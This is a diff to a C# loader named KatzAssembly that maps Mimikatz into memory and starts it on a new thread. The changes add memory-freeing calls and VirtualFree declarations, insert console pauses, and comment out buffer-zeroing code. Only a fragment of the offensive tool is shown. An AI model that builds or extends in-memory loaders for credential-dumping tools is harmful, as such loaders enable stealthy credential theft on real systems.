@@ -9,6 +9,7 @@ using System.Runtime.InteropServices;
 using System.Security;
 using System.Security.Cryptography;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace KatzAssembly
@@ -351,6 +352,7 @@ namespace KatzAssembly
                     Console.WriteLine("Executing Mimikatz");
                     threadStart = IntPtr.Add(codebase, (int)pe.OptionalHeader32.AddressOfEntryPoint);
                     hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
+
                     NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);
                     
 
@@ -410,16 +412,20 @@ namespace KatzAssembly
             //Transfer Control To OEP
             t.Dispose();
             Console.WriteLine("Thread Complete");
+            Console.ReadLine();
 
+            NativeDeclarations.VirtualFree(codebase, 0, NativeDeclarations.FreeType.Release);
 
-            //Console.ReadLine();
-
-
-            unpacked = unpacked.Select(n => Convert.ToByte(0)).ToArray();
-            pe = null;
-            GC.Collect();
-            GC.WaitForFullGCComplete();
+            //unpacked = unpacked.Select(n => Convert.ToByte(0)).ToArray();
+            //Byte[] array = new Byte[pe.RawBytes.Length];
+            //Array.Clear(array, 0, array.Length);
+            //Marshal.Copy(array, 0, codebase, array.Length);
             
+            //pe = null;
+            //GC.Collect();
+            //GC.WaitForFullGCComplete();
+            Console.WriteLine("Free memory");
+            Console.ReadLine();
 
         } //End Main
 
@@ -681,8 +687,6 @@ namespace KatzAssembly
                     imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                 }
 
-
-
                 RawBytes = System.IO.File.ReadAllBytes(filePath);
 
             }
@@ -893,6 +897,12 @@ namespace KatzAssembly
 
         [DllImport("kernel32")]
         public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
+        public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, FreeType dwFreeType);
+
+        [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
+        public static extern bool VirtualFree(IntPtr lpAddress, int dwSize, FreeType dwFreeType);
 
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
         public static extern IntPtr LoadLibrary(string lpFileName);
